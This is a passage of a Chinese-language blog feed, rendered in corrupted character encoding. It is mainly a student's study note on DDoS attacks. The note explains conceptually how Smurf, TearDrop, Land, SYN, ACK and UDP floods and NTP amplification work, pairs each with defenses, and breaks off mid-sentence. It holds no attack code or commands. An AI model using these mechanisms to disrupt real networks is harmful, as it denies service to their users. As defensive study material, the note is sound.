<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://github.com/wuyanxin/totp.js" target="_blank" rel="noopener">TOTPä½œè€…ç®—æ³•</a><br><a href="https://blog.csdn.net/chasingin/article/details/104642522/" target="_blank" rel="noopener">W4nderå¸ˆå‚…çš„wp</a><br><a href="https://xz.aliyun.com/t/5967" target="_blank" rel="noopener">æµ…æDelCTF webä¹‹Giftboxé¢˜è§£</a><br><a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">èµµæ€»çš„wp</a><br><a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">ä»ä¸€é“é¢˜è®²PHPå¤æ‚å˜é‡</a><br><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedirçš„æ–°æ–¹æ³•</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>write up</tag>
      </tags>
  </entry>
  <entry>
    <title>DDoSåŸç†ä¸é˜²å¾¡</title>
    <url>/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>æ„Ÿè§‰è‡ªå·±æœ€è¿‘å¾ˆé¢“åºŸï¼Œå› ä¸ºä¸€ç‚¹å°äº‹å°±æƒ³ç€é€ƒé¿ï¼Œç„¶åæ‘¸é±¼æ‘¸ä¸€å¤©<br>ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡ï¼Œä¸»è¦æ˜¯å› ä¸ºè€ƒè¯•è€ƒåˆ°äº†ï¼Œæ‰€ä»¥è®°å½•å­¦ä¹ ä¸€ä¸‹<br>                                â€“ æ‡’ç‹—å‘è¨€</p>
<h1 id="DDoSç®€ä»‹"><a href="#DDoSç®€ä»‹" class="headerlink" title="DDoSç®€ä»‹"></a>DDoSç®€ä»‹</h1><p><strong>DDoS(Distributed Denial of Service)</strong>ï¼Œåˆç§°åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ã€‚<br>é€šè¿‡æ§åˆ¶å¤šä¸ªè‚‰é¸¡æˆ–æœåŠ¡å™¨ç»„æˆçš„åƒµå°¸ç½‘ç»œï¼Œå¯¹ç›®æ ‡å‘é€å¤§é‡çœ‹ä¼¼åˆæ³•è¯·æ±‚ï¼Œä»è€Œå ç”¨å¤§é‡ç½‘ç»œèµ„æºï¼Œç˜«ç—ªç½‘ç»œï¼Œé˜»æ­¢ç”¨æˆ·å¯¹ç½‘ç»œèµ„æºoçš„æ­£å¸¸è®¿é—®ã€‚</p>
<h2 id="DDoSå±å®³"><a href="#DDoSå±å®³" class="headerlink" title="DDoSå±å®³"></a>DDoSå±å®³</h2><p>å‡ºå£å¸¦å®½å µæ­»<br>æ¸¸æˆæ‰çº¿å¯¼è‡´å®¢æˆ·æµå¤±<br>æœåŠ¡å™¨è¿æ¥æ•°å¤šï¼Œè¿æ¥èµ„æºè¢«è€—å°½<br>æœåŠ¡å™¨å¡ã€æ…¢ã€æ­»æœºã€æ— æ³•è¿æ¥</p>
<h2 id="æ”»å‡»æ¥æº"><a href="#æ”»å‡»æ¥æº" class="headerlink" title="æ”»å‡»æ¥æº"></a>æ”»å‡»æ¥æº</h2><p>é«˜æ€§èƒ½æœåŠ¡å™¨é…åˆå‘åŒ…è½¯ä»¶<br>å¯è”ç½‘çš„è®¾å¤‡(å¦‚æ‰“å°æœºã€æ‘„åƒå¤´ã€ç”µè§†ç­‰ç­‰)<br>ç§»åŠ¨è®¾å¤‡(æ•°é‡å¤šï¼Œå¢é•¿é€Ÿåº¦å¿«ï¼Œå…¶é«˜æ€§èƒ½åˆ©äºç»„å»ºåƒµå°¸ç½‘ç»œ)<br>ä¸ªäººPC(å­˜åœ¨æ¼æ´çš„PCæˆ–ä¸€äº›é»‘å®¢è¿·è‡ªæ„¿æˆä¸ºDDOSä¸€å‘˜)<br>éª‡å®¢æ§åˆ¶çš„åƒµå°¸ç½‘ç»œ(åƒµå°¸ç½‘ç»œåˆåˆ†ä¸ºIRCå‹ã€HTTPå‹ã€P2På‹)</p>
<h2 id="æµé‡ç‰¹ç‚¹"><a href="#æµé‡ç‰¹ç‚¹" class="headerlink" title="æµé‡ç‰¹ç‚¹"></a>æµé‡ç‰¹ç‚¹</h2><p>IPåœ°å€éšæœºæˆ–å›ºå®šæŸäº›IPæ®µéšæœº<br>æ²¡æœ‰å®Œæ•´å®Œæˆä¸‰æ¬¡æ¡æ‰‹<br>åœ°å€å¤šæ•°æ˜¯ä¼ªé€ çš„<br>è¯·æ±‚æ•°é‡å¤§ã€å¿«</p>
<h2 id="å¯¼è‡´DDoSåŸå› "><a href="#å¯¼è‡´DDoSåŸå› " class="headerlink" title="å¯¼è‡´DDoSåŸå› "></a>å¯¼è‡´DDoSåŸå› </h2><p>ä¸ªäººå› ç´ ï¼šé‡‘é’±åˆ©ç›Š æ”¿æ²»å†²çª å®—æ•™å†²çª ä¸ºæ±‚å‡ºå</p>
<p>æœåŠ¡å¸¦å®½ä¸Šé™ ç½‘ç»œåè®®å­˜åœ¨ç¼ºé™·<br>æœåŠ¡å™¨è®¾å¤‡æ€§èƒ½ä¸Šé™<br>åº”ç”¨æ€§èƒ½ä¸Šé™<br>ç³»ç»Ÿæ€§èƒ½ä¸Šé™</p>
<hr>
<h1 id="æ”»å‡»ç±»å‹åŠé˜²å¾¡"><a href="#æ”»å‡»ç±»å‹åŠé˜²å¾¡" class="headerlink" title="æ”»å‡»ç±»å‹åŠé˜²å¾¡"></a>æ”»å‡»ç±»å‹åŠé˜²å¾¡</h1><h2 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h2><p>æ”»å‡»è€…å‘ç½‘å…³å‘é€ <code>ICMPè¯·æ±‚åŒ…</code>ï¼Œå¹¶å°†è¯¥ <code>ICMPè¯·æ±‚æŠ¥æ–‡çš„æºåœ°å€</code> ä¼ªé€ æˆ <code>å—å®³ä¸»æœºIPåœ°å€</code>ï¼Œç›®çš„åœ°å€ä¸ºå¹¿æ’­åœ°å€ã€‚<br>è·¯ç”±å™¨åœ¨æ¥å—åˆ°è¯¥æ•°æ®åŒ…ï¼Œå‘ç°ç›®çš„åœ°å€æ˜¯<strong>å¹¿æ’­åœ°å€</strong>ï¼Œå°±ä¼šå°†è¯¥æ•°æ®åŒ…å¹¿æ’­å‡ºå»ï¼Œå±€åŸŸç½‘å†…æ‰€æœ‰çš„ <strong>å­˜æ´»ä¸»æœº</strong> éƒ½ä¼šå—åˆ°ä¸€ä¸ª <code>ICMPè¯·æ±‚åŒ…</code>ï¼Œ<strong>æºåœ°å€æ˜¯å—å®³ä¸»æœºIP</strong>ã€‚æ¥ä¸‹æ¥å—å®³ä¸»æœºå°±ä¼šæ”¶åˆ°è¯¥ç½‘ç»œå†…æ‰€æœ‰ä¸»æœºå‘æ¥çš„ <code>ICMPåº”ç­”æŠ¥æ–‡</code> ï¼Œé€šè¿‡å¤§é‡è¿”å›çš„ICMPåº”ç­”æŠ¥æ–‡æ¥æ·¹æ²¡å—å®³ä¸»æœºï¼Œæœ€ç»ˆå¯¼è‡´ç½‘ç»œé˜»å¡ï¼Œå—å®³ä¸»æœºå´©æºƒã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" data-fancybox="group" data-caption="ddos_1" class="fancybox"><img alt="ddos_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" class="lazyload" title="ddos_1"></a></p>
<p>é˜²æŠ¤æ–¹æ¡ˆï¼š</p>
<ul>
<li>ç¦æ­¢è·¯ç”±å™¨å¹¿æ’­ICMPè¯·æ±‚åŒ…ï¼›</li>
<li>ç¦æ­¢æ“ä½œç³»ç»Ÿå¯¹å¹¿æ’­å‘å‡ºçš„ICMPè¯·æ±‚åŒ…åšå‡ºå“åº”ï¼›</li>
<li>é…ç½®é˜²ç«å¢™é™æ­¢æ¥è‡ªä½ æ‰€å¤„ç½‘ç»œå¤–éƒ¨çš„pingåŒ…</li>
</ul>
<hr>
<h2 id="TearDrop-Attack"><a href="#TearDrop-Attack" class="headerlink" title="TearDrop Attack"></a>TearDrop Attack</h2><p>åœ¨äº†è§£è¿™ç§æ”»å‡»ä¹‹å‰ï¼Œéœ€è¦å…ˆçŸ¥é“ä»€ä¹ˆæ˜¯ <code>IP fragmentation(æ•°æ®åŒ…åˆ†ç‰‡)</code>ã€‚æ•°æ®åœ¨ç½‘ç»œä¸­ä¼ è¾“å¿…å®šä¼šäº§ç”Ÿæ•°æ®åŒ…è¢«åˆ†ç‰‡ï¼Œå› ä¸ºæ¯ç§ç½‘ç»œéƒ½æœ‰ä¸åŒçš„æœ€å¤§å•ä¸ªæ•°æ®åŒ…çš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„ <code>MTU (Maximum Transmission Unitï¼Œæœ€å¤§ä¼ è¾“å•å…ƒ)</code>ã€‚å½“è¦ä¼ è¾“çš„æ•°æ®è¶…è¿‡ä½ è¦é€šä¿¡çš„é‚£å°ä¸»æœºæ‰€å¤„ç½‘ç»œçš„MTUæ—¶ï¼Œæ•°æ®åŒ…å°±ä¼šè¢«åˆ†ç‰‡è¿›è¡Œä¼ è¾“ï¼Œç„¶ååœ¨åˆ°è¾¾ç›®çš„åœ°å†é‡æ–°ç»„è£…æˆåŸæ¥çš„æ•°æ®åŒ…ï¼Œä¸‹é¢æ˜¯æ•°æ®åŒ…åˆ†ç‰‡é‡ç»„è¿‡ç¨‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" data-fancybox="group" data-caption="ddos_2" class="fancybox"><img alt="ddos_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" class="lazyload" title="ddos_2"></a></p>
<p><code>TearDrop Attack</code>ï¼Œå°±æ˜¯é€šè¿‡è®¾ç½®é”™è¯¯çš„ç‰‡åç§»ï¼Œä½¿å¾—æ•°æ®åŒ…åˆ°è¾¾ç›®çš„åœ°æ—¶ï¼ŒæœåŠ¡å™¨æ— æ³•é‡æ–°ç»„åˆæ•°æ®åŒ…ï¼Œå› ä¸ºæ•°æ®åŒ…çš„ç»„åˆæ˜¯é€šè¿‡ç‰‡åç§»æ¥ç»„è£…çš„ï¼Œæœ€ç»ˆå¯¼è‡´å´©æºƒã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" data-fancybox="group" data-caption="ddos_3" class="fancybox"><img alt="ddos_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" class="lazyload" title="ddos_3"></a></p>
<p>å¯¹æ¯”ä¸€ä¸‹æ­£å¸¸IPæ•°æ®åŒ…å’Œé”™è¯¯IPæ•°æ®åŒ…</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" data-fancybox="group" data-caption="ddos_4" class="fancybox"><img alt="ddos_4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" class="lazyload" title="ddos_4"></a></p>
<p>è¿™ç§æ”»å‡»ä¸»è¦å¯¹æ—§çš„windowsç‰ˆæœ¬å’ŒLinuxç‰ˆæœ¬æœ‰æ•ˆï¼Œé˜²æŠ¤çš„è¯ï¼Œå¯ä»¥æ£€æµ‹å‘æ¥çš„æ•°æ®åŒ…ç‰‡åç§»æ˜¯å¦åˆæ³•ï¼Œå¦‚æœåˆæ³•åœ¨ç»„è£…ï¼Œä¸åˆæ³•ç›´æ¥ä¸¢å¼ƒã€‚ä¾‹å¦‚è¿™ä¸ªï¼š<a href="https://wenku.baidu.com/view/b45bba61ddccda38376baf7f.html" target="_blank" rel="noopener">åˆ†ç‰‡é‡ç»„æ£€æŸ¥ç®—æ³• &lt;- link</a>ã€‚</p>
<p>ç½‘ç»œå®‰å…¨è®¾å¤‡å°†æ¥æ”¶åˆ°çš„<strong>åˆ†ç‰‡æŠ¥æ–‡</strong>å…ˆæ”¾å…¥<strong>ç¼“å­˜</strong>ä¸­ï¼Œå¹¶æ ¹æ®<strong>æºIPåœ°å€</strong>å’Œ<strong>ç›®çš„IPåœ°å€</strong>å¯¹æŠ¥æ–‡è¿›è¡Œåˆ†ç»„ï¼ŒæºIPåœ°å€å’Œç›®çš„IPåœ°å€å‡ç›¸åŒçš„æŠ¥æ–‡å½’å…¥åŒä¸€ç»„ï¼Œç„¶åå¯¹æ¯ç»„IPæŠ¥æ–‡çš„ç›¸å…³åˆ†ç‰‡ä¿¡æ¯è¿›è¡Œæ£€æŸ¥ï¼Œ<strong>ä¸¢å¼ƒåˆ†ç‰‡ä¿¡æ¯å­˜åœ¨é”™è¯¯çš„æŠ¥æ–‡</strong>ã€‚ä¸ºäº†é˜²æ­¢ç¼“å­˜ç›Šå¤„ï¼Œå½“ç¼“å­˜å¿«è¦å­˜æ»¡æ˜¯ï¼Œç›´æ¥ä¸¢å¼ƒåç»­åˆ†ç‰‡æŠ¥æ–‡ã€‚</p>
<hr>
<h2 id="Land-Attack"><a href="#Land-Attack" class="headerlink" title="Land Attack"></a>Land Attack</h2><p>æ”»å‡»è€…å‘åŠ¨ <code>Land Attack</code> æ”»å‡»æ—¶ï¼Œéœ€è¦å…ˆå‘å‡ºä¸€ä¸ªSYNæ•°æ®åŒ…ï¼Œå¹¶å°†æ•°æ®åŒ…çš„æºIPä¸ç›®çš„IPéƒ½è®¾ç½®æˆè¦æ”»å‡»çš„ç›®æ ‡IPï¼Œè¿™æ ·ç›®æ ‡åœ¨æ¥æ”¶åˆ°SYNæ•°æ®åŒ…åï¼Œä¼šæ ¹æ®æºIPå›åº”ä¸€ä¸ªSYN+ACKæ•°æ®åŒ…ï¼Œå³å’Œè‡ªå·±å»ºç«‹ä¸€ä¸ªç©ºè¿æ¥ï¼Œç„¶ååˆ°è¾¾idelè¶…æ—¶æ—¶é—´æ—¶ï¼Œæ‰ä¼šé‡Šæ”¾è¿™ä¸ªè¿æ¥ã€‚æ”»å‡»è€…å‘é€å¤§é‡è¿™æ ·çš„æ•°æ®åŒ…ï¼Œä»è€Œè€—å°½ç›®æ ‡çš„TCPè¿æ¥æ± ï¼Œæœ€ç»ˆå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" data-fancybox="group" data-caption="ddos_5" class="fancybox"><img alt="ddos_5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" class="lazyload" title="ddos_5"></a></p>
<p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>é€šè¿‡<strong>è®¾ç½®é˜²ç«å¢™å’Œè·¯ç”±è§„åˆ™</strong>ï¼Œæ£€æµ‹æºIPä¸ç›®çš„IPç›¸åŒçš„æ•°æ®åŒ…ï¼Œä¸¢å¼ƒã€è¿‡æ»¤è¿™ç§æ•°æ®åŒ…ã€‚(ç±»ä¼¼ä¸Šè¿°çš„ <font color="6495ED">TearDrop Attack</font>)</li>
</ul>
<hr>
<h2 id="SYN-flood-attack-å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†"><a href="#SYN-flood-attack-å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†" class="headerlink" title="SYN flood attack (å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†)"></a>SYN flood attack (å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†)</h2><p><code>SYN flood attack</code> æ˜¯åœ¨TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ã€‚æ”»å‡»è€…é€šè¿‡å‘é€å¤§é‡ä¼ªé€ çš„å¸¦æœ‰<font color="6495ED">SYNæ ‡å¿—ä½çš„TCPæŠ¥æ–‡</font>ï¼Œä¸ç›®æ ‡ä¸»æœºå»ºç«‹äº†å¾ˆå¤šè™šå‡çš„<strong>åŠå¼€è¿æ¥</strong>ï¼Œåœ¨æœåŠ¡å™¨è¿”å›<font color="6495ED">SYN+ACKæ•°æ®åŒ…</font>åï¼Œæ”»å‡»è€…ä¸å¯¹å…¶åšå‡ºå“åº”ï¼Œä¹Ÿå°±æ˜¯ä¸è¿”å›ACKæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œè¿™æ ·æœåŠ¡å™¨å°±ä¼šä¸€ç›´ç­‰å¾…ç›´åˆ°è¶…æ—¶ã€‚è¿™ç§æ”»å‡»æ–¹å¼ä¼šä½¿ç›®æ ‡æœåŠ¡å™¨è¿æ¥èµ„æºè€—å°½ã€é“¾è·¯å µå¡ï¼Œä»è€Œè¾¾åˆ°æ‹’ç»æœåŠ¡çš„ç›®çš„ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" data-fancybox="group" data-caption="ddos_6" class="fancybox"><img alt="ddos_6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" class="lazyload" title="ddos_6"></a></p>
<p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>:</p>
<ul>
<li><p><font color="6495ED">SYN Check</font>ï¼šä½¿ç”¨é˜²æŠ¤è®¾å¤‡ï¼Œ<strong>3æ¬¡æ¡æ‰‹å˜æˆäº†6æ¬¡æ¡æ‰‹</strong>ï¼Œç”±é˜²æŠ¤è®¾å¤‡æ£€æµ‹SYNè¯·æ±‚æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡åå†ç”±é˜²æŠ¤è®¾å¤‡å°†æŠ¥æ–‡è½¬å‘ç»™æœåŠ¡å™¨ï¼Œåç»­æŠ¥æ–‡ä»ç”±é˜²æŠ¤è®¾å¤‡ä»£ç†ã€‚</p>
</li>
<li><p><font color="6495ED">Micro blocks</font>ï¼šç®¡ç†å‘˜å¯ä»¥åœ¨å†…å­˜ä¸­<strong>ä¸ºæ¯ä¸ªSYNè¯·æ±‚åˆ›å»ºä¸€ä¸ªå°ç´¢å¼•(å°äº16å­—èŠ‚)</strong>ï¼Œè€Œä¸å¿…æŠŠæ•´ä¸ªè¿æ¥å¯¹è±¡å­˜å…¥å†…å­˜ã€‚</p>
</li>
<li><p><font color="6495ED">RST cookies</font>ï¼šåœ¨å®¢æˆ·ç«¯å‘èµ·ç¬¬ä¸€ä¸ªSYNè¯·æ±‚åï¼ŒæœåŠ¡å™¨æ•…æ„å›åº”ä¸€ä¸ªé”™è¯¯çš„SYN+ACKæŠ¥æ–‡ã€‚å¦‚æœåˆæ³•ç”¨æˆ·æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡ï¼Œå°±ä¼šç»™æœåŠ¡å™¨å“åº”RSTæŠ¥æ–‡ã€‚å½“æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡æ—¶ï¼Œå°±å°†è¿™ä¸ªä¸»æœºçš„IPè®°å½•è¿›åˆæ³•IPåˆ—è¡¨ï¼Œä¸‹æ¬¡è¯¥ä¸»æœºå‘èµ·SYNè¯·æ±‚æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡äº†ã€‚</p>
</li>
<li><p><font color="6495ED">STACK tweaking</font>ï¼šç®¡ç†å‘˜å¯ä»¥è°ƒæ•´TCPå †æ ˆä»¥å‡ç¼“SYNæ³›æ´ªæ”»å‡»çš„å½±å“ã€‚è¿™åŒ…æ‹¬<strong>å‡å°è¶…æ—¶æ—¶é—´</strong>ï¼Œ<strong>ç­‰åˆ°å †æ ˆå­˜é‡Šå†…æ”¾æ—¶å†åˆ†é…è¿æ¥</strong>ï¼Œå¦åˆ™å°±éšæœºæ€§åœ°åˆ é™¤ä¼ å…¥çš„è¿æ¥ã€‚</p>
</li>
</ul>
<h2 id="ACK-Flood-Attack"><a href="#ACK-Flood-Attack" class="headerlink" title="ACK Flood Attack"></a>ACK Flood Attack</h2><p><code>ACK Flood Attack</code> æ˜¯åˆ©ç”¨TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚è¿™é‡Œå¯ä»¥åˆ†ä¸ºä¸¤ç§ã€‚</p>
<h3 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h3><p><strong>æ”»å‡»è€…</strong>ä¼ªé€ å¤§é‡çš„ <code>SYN+ACKåŒ…</code> å‘é€ç»™ç›®æ ‡ä¸»æœºï¼Œç›®æ ‡ä¸»æœºæ¯æ”¶åˆ°ä¸€ä¸ª <code>SYN+ACKæ•°æ®åŒ…</code> æ—¶ï¼Œéƒ½ä¼šå»<strong>è‡ªå·±çš„TCPè¿æ¥è¡¨ä¸­æŸ¥çœ‹æœ‰æ²¡æœ‰ä¸ACKçš„å‘é€è€…å»ºç«‹è¿æ¥</strong> ï¼Œ<strong>å¦‚æœæœ‰åˆ™å‘é€ACKåŒ…å®ŒæˆTCPè¿æ¥ï¼Œå¦‚æœæ²¡æœ‰åˆ™å‘é€ ACK+RST æ–­å¼€è¿æ¥</strong>ã€‚ä½†æ˜¯åœ¨æŸ¥è¯¢è¿‡ç¨‹ä¸­ä¼šæ¶ˆè€—ä¸€å®šçš„CUPè®¡ç®—èµ„æºã€‚å¦‚æœç¬é—´æ”¶åˆ°å¤§é‡çš„SYN+ACKæ•°æ®åŒ…ï¼Œå°†ä¼šæ¶ˆè€—æœåŠ¡å™¨çš„å¤§é‡cpuèµ„æºï¼Œå¯¼è‡´<font color="6495ED">æ­£å¸¸çš„è¿æ¥æ— æ³•å»ºç«‹æˆ–å¢åŠ å»¶è¿Ÿï¼Œç”šè‡³é€ æˆæœåŠ¡å™¨ç˜«ç—ªã€æ­»æœºã€‚</font></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" data-fancybox="group" data-caption="ddos_7" class="fancybox"><img alt="ddos_7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" class="lazyload" title="ddos_7"></a></p>
<h3 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h3><p><strong>åˆ©ç”¨TCPä¸‰æ¬¡æ¡æ‰‹çš„ACK+SYNåº”ç­”</strong>ï¼Œæ”»å‡»è€…å‘ä¸åŒçš„æœåŠ¡å™¨å‘é€å¤§é‡çš„SYNè¯·æ±‚ï¼Œè¿™äº›SYNè¯·æ±‚æ•°æ®åŒ…çš„æºIPå‡ä¸ºå—å®³ä¸»æœºIPï¼Œè¿™æ ·å°±ä¼šæœ‰å¤§é‡çš„SYN+ACKåº”ç­”æ•°æ®åŒ…å‘å¾€å—å®³ä¸»æœºï¼Œä»è€Œå ç”¨ç›®æ ‡çš„ç½‘ç»œå¸¦å®½èµ„æºï¼Œå½¢æˆæ‹’ç»æœåŠ¡ã€‚</p>
<p>é€šå¸¸DDOSæ”»å‡»ä¼šå°†ACK floodä¸SYN floodç»“åˆåœ¨ä¸€èµ·ï¼Œä»è€Œæ‰©å¤§å¨åŠ›ã€‚<br><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>å¯å‚è€ƒå¦‚ä¸‹ï¼š</p>
<ul>
<li>é‡‡ç”¨CDNè¿›è¡Œæµé‡ç¨€é‡Šï¼›</li>
<li>é¿å…æœåŠ¡å™¨IPæš´éœ²åœ¨å…¬ç½‘ä¸Šï¼›</li>
<li>é€šè¿‡é™é€Ÿæˆ–åŠ¨æ€æŒ‡çº¹çš„æ–¹å¼ï¼›</li>
<li>åˆ©ç”¨å¯¹ç§°æ€§åˆ¤æ–­æ¥åˆ†æå‡ºæ˜¯å¦æœ‰æ”»å‡»å­˜åœ¨ï¼›</li>
<li>åœ¨è¿ç»­æ”¶åˆ°ç”¨æˆ·å‘é€çš„ACKåŒ…æ—¶ï¼Œä¸­æ–­å›è¯ï¼Œè®©å…¶é‡è¿ã€‚</li>
</ul>
<h2 id="UDP-FLood-Attack"><a href="#UDP-FLood-Attack" class="headerlink" title="UDP FLood Attack"></a>UDP FLood Attack</h2><p><code>UDP</code>ï¼ˆ<code>User Datagram Protocol</code>ï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰ï¼Œæ˜¯ä¸€ç§<strong>æ— è¿æ¥å’Œæ— çŠ¶æ€çš„ç½‘ç»œåè®®</strong>ï¼ŒUDPä¸éœ€è¦åƒTCPé‚£æ ·è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œè¿è¡Œå¼€é”€ä½ï¼Œä¸éœ€è¦ç¡®è®¤æ•°æ®åŒ…æ˜¯å¦æˆåŠŸåˆ°è¾¾ç›®çš„åœ°ã€‚è¿™å°±é€ æˆUDPæ³›æ´ªæ”»å‡»ä¸ä½†æ•ˆç‡é«˜ï¼Œè€Œä¸”è¿˜å¯ä»¥åœ¨èµ„æºç›¸å¯¹è¾ƒå°‘çš„æƒ…å†µä¸‹æ‰§è¡Œã€‚<code>UDP FLood</code> å¯ä»¥ä½¿ç”¨å°æ•°æ®åŒ…(64å­—èŠ‚)è¿›è¡Œæ”»å‡»,ä¹Ÿå¯ä»¥ä½¿ç”¨å¤§æ•°æ®åŒ…(å¤§äº1500å­—èŠ‚,ä»¥å¤ªç½‘MTUä¸º1500å­—èŠ‚)è¿›è¡Œæ”»å‡»ã€‚å¤§é‡å°æ•°æ®åŒ…ä¼šå¢å¤§ç½‘ç»œè®¾å¤‡å¤„ç†æ•°æ®åŒ…çš„å‹åŠ›ï¼›è€Œå¯¹äºå¤§æ•°æ®åŒ…ï¼Œç½‘ç»œè®¾å¤‡éœ€è¦è¿›è¡Œåˆ†ç‰‡ã€é‡ç»„ï¼Œæœ€ç»ˆè¾¾åˆ°çš„æ•ˆæœå°±æ˜¯<strong>å ç”¨ç½‘ç»œä¼ è¾“æ¥å£çš„å¸¦å®½ã€ç½‘ç»œå µå¡ã€æœåŠ¡å™¨å“åº”æ…¢ç­‰ç­‰ã€‚</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" data-fancybox="group" data-caption="ddos_8" class="fancybox"><img alt="ddos_8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" class="lazyload" title="ddos_8"></a></p>
<p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>é™åˆ¶æ¯ç§’é’Ÿæ¥å—åˆ°çš„æµé‡(å¯èƒ½äº§ç”Ÿè¯¯åˆ¤)ï¼›</li>
<li>é€šè¿‡åŠ¨æ€æŒ‡çº¹å­¦ä¹ (éœ€è¦æ”»å‡»å‘ç”Ÿä¸€å®šæ—¶é—´)ï¼Œå°†éæ³•ç”¨æˆ·åŠ å…¥é»‘åå•ã€‚</li>
</ul>
<hr>
<h2 id="NTPæ”¾å¤§æ”»å‡»-åˆæ­¥åªä½œç‚¹äº†è§£"><a href="#NTPæ”¾å¤§æ”»å‡»-åˆæ­¥åªä½œç‚¹äº†è§£" class="headerlink" title="NTPæ”¾å¤§æ”»å‡»(åˆæ­¥åªä½œç‚¹äº†è§£)"></a>NTPæ”¾å¤§æ”»å‡»(åˆæ­¥åªä½œç‚¹äº†è§£)</h2><p><code>NTP</code> (<code>Network Time Protocol</code>ï¼Œç½‘ç»œæ—¶é—´åè®®)ï¼Œæ˜¯ç”¨æ¥ä½¿è®¡ç®—æœºç½‘ç»œæ—¶é—´åŒæ­¥åŒ–çš„ä¸€ç§åè®®ï¼Œå®ƒå¯ä»¥ä½¿è®¡ç®—æœºä¸æ—¶é’Ÿæºè¿›è¡ŒåŒæ­¥åŒ–å¹¶æä¾›é«˜ç²¾åº¦çš„æ—¶é—´æ ¡æ­£ï¼Œä½¿ç”¨ <code>UDP 123</code> ç«¯å£è¿›è¡Œé€šä¿¡ã€‚<br>é€šå¸¸åœ¨NTPæœåŠ¡å™¨ä¸Šä¼šæœ‰ä¸€äº›è°ƒè¯•æ¥å£ï¼Œè€Œ <strong>åˆ©ç”¨è¿™äº›æ¥å£ä¸­çš„monlistè¯·æ±‚ï¼Œå°±å¯è§¦å‘æ”¾å¤§æ”»å‡»ã€‚</strong> å½“<strong>ä¸»æœº</strong>å‘ <code>NTPæœåŠ¡å™¨</code> å‘é€ <strong>monlistæŸ¥è¯¢è¯·æ±‚</strong> æ—¶ï¼ŒNTPæœåŠ¡å™¨ä¼šå°†ä¸ä¹‹è¿›è¡Œæ—¶é—´åŒæ­¥çš„æœ€å600ä¸ªIPåœ°å€è¿”å›ã€‚æ‰€ä»¥æ”»å‡»è€…åªéœ€è¦å°†æºåœ°å€ä¼ªé€ 